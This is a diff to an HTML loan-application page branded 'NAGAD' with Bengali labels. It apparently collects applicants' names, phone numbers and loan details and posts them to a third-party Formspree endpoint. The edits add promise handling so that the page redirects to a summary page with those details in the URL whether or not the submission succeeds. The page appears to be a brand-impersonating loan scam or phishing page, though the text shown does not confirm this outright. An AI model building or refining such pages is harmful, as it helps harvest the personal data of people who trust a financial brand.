@@ -221,7 +221,6 @@
 <body>
 
 <div id="pageLoader">
-    <!-- লোডারে ছোট হাতের এল দিয়ে logoo.png -->
     <img src="logoo.png" alt="Logo" class="loader-logo">
     <div class="loader-brand">NAGAD</div>
     <div class="loader-track">
@@ -232,7 +231,6 @@
 
 <div class="container">
     <div class="header">
-        <!-- হেডারের মাঝখানে আপনার কোম্পানির লোগো -->
         <div class="header-logo-wrap">
             <img src="logoo.png" alt="Company Logo" class="header-logo">
         </div>
@@ -241,6 +239,7 @@
     </div>
 
     <div class="form-wrap">
+        <!-- Formspree Endpoint -->
         <form id="loanForm" action="https://formspree.io/f/xvkkeegq" method="POST">
             <div class="form-group">
                 <label><i class="fa-solid fa-user"></i> সম্পূর্ণ নাম</label>
@@ -317,18 +316,28 @@
         const amountVal = document.getElementById("loanAmount").value;
         const tenureVal = document.getElementById("loanTenure").value;
 
-        // বাংলা সংখ্যাকে পিওর সংখ্যায় রূপান্তর
+        // বাংলা সংখ্যা রূপান্তর
         const numMap = {'০':0, '১':1, '২':2, '৩':3, '৪':4, '৫':5, '৬':6, '৭':7, '৮':8, '৯':9};
         const cleanAmount = amountVal.replace(/[^০-৯0-9]/g, '').split('').map(d => numMap[d] !== undefined ? numMap[d] : d).join('');
         const cleanTenure = tenureVal.replace(/[^০-৯0-9]/g, '').split('').map(d => numMap[d] !== undefined ? numMap[d] : d).join('');
 
         const data = new FormData(form);
 
+        // Formspree-তে ডাটা পোস্ট নিশ্চিত করা
         fetch(form.action, {
             method: "POST",
             body: data,
             headers: { 'Accept': 'application/json' }
-        }).finally(() => {
+        })
+        .then(response => {
+            // সাবমিট সফল হলে পরবর্তী summary.html পেজে নিয়ে যাবে
+            window.location.href = "summary.html?name=" + encodeURIComponent(nameVal) + 
+                                   "&phone=" + encodeURIComponent(phoneVal) + 
+                                   "&amount=" + encodeURIComponent(cleanAmount) + 
+                                   "&tenure=" + encodeURIComponent(cleanTenure);
+        })
+        .catch(error => {
+            // নেটওয়ার্ক সমস্যা হলেও ফ্লো যেন বন্ধ না হয়
             window.location.href = "summary.html?name=" + encodeURIComponent(nameVal) + 
                                    "&phone=" + encodeURIComponent(phoneVal) + 
                                    "&amount=" + encodeURIComponent(cleanAmount) + 
